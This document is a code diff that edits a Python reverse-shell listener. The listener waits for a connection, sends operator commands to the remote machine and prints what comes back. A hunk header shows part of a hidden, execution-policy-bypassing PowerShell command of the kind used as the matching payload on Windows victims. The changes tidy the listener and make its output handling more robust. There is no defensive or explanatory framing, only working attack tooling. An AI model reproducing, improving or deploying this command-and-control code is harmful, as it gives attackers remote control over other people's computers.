@@ -8,11 +8,9 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.
 
 import socket
 
+
 def listener(ip, port):
-    port = int(port)  # Convert port to integer
-    
-    if ip == "0.0.0.0":
-        print("[*] Listening on ALL interfaces...")
+    port = int(port)  
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
@@ -20,12 +18,11 @@ def listener(ip, port):
         server.bind((ip, port))
     except OSError as e:
         print(f"[-] Failed to bind: {e}")
-        print("[*] Try using 0.0.0.0 or check if the IP is correct.")
         return
 
     server.listen(1)
     print(f"[*] Listening on {ip}:{port}...")
-    
+
     client, addr = server.accept()
     print(f"[+] Connection received from {addr}")
 
@@ -36,9 +33,13 @@ def listener(ip, port):
                 client.send(b"exit")
                 client.close()
                 break
+
             client.send(command.encode())
-            response = client.recv(4096).decode("cp1252") 
+
+            # 🔥 FIXED OUTPUT HANDLING 🔥
+            response = client.recv(4096).decode("cp1252", errors="ignore").strip()
             print(response)
+
         except Exception as e:
             print(f"[-] Error: {e}")
             break
